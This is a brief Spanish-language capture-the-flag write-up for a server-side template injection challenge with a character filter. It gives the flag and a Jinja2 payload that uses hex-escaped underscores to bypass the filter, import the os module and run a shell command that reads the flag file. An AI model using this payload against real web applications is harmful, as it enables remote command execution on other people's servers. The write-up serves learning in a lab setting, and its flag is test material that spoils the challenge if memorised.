
# Descripción 
 made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)
# Solución
academy{sst1_f1lt3r_byp4ss_afa6aa72}
# Notas adicionales
use los mismo pasos que en el ssti 1 y me dio la flag pero use 
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
# Referencias